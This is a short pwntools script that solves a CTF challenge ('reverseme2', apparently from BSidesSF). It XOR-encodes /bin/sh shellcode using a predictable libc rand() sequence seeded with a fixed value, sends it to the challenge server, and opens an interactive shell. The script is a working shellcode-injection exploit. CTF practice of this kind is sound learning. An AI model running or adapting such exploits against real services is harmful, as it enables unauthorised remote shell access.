from pwn import *
from ctypes import *
libc = '/lib/x86_64-linux-gnu/libc-2.19.so'
funcs = CDLL(libc)

context.update(log_level = 'debug', arch='amd64', os='linux')

#p = process('reverseme2')
p = remote('reverseme2-24b392b5.challenges.bsidessf.net', 1339)

p.recvline()


shellcode = asm(shellcraft.amd64.linux.sh())
xor_code=''
funcs.srand(0x13371337)
for x in shellcode:
	tp = int(x.encode('hex'), 16)
	xor_code += chr(tp ^ ((funcs.rand() >>3)&0xff))
print xor_code
p.sendline(xor_code)
p.interactive()
